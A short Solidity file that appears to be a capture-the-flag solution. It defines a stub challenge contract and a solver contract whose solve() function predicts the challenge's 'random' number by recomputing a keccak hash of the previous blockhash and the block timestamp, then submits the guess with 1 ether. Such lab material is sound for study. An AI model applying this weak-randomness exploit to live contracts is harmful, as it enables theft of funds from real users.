pragma solidity ^0.8.15;

contract ChallangeContract {
    constructor() payable {

    }

    function isComplete() public view returns (bool) {

    }

    function guess(uint8 n) public payable {
        
    }
}

contract Soln{
    ChallangeContract ctr;

    address ctrAddress = 0x72f5BAD1dC4f52c831074f563b08cd26a03BebBB;
    address payable owner = payable(0x66f68692c03eB9C0656D676f2F4bD13eba40D1B7);

    constructor() payable{
        require(msg.value == 1 ether);
        ctr = ChallangeContract(ctrAddress);
    }

    function solve() public {
        uint8 answer =  uint8(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))[31]);
        ctr.guess{value: 1 ether}(answer);
    }

    fallback() external payable {

    }

    receive() external payable {

    }

    function getEthersBack(uint8 amount) public {
        owner.transfer(amount * 10**18);
    }
}
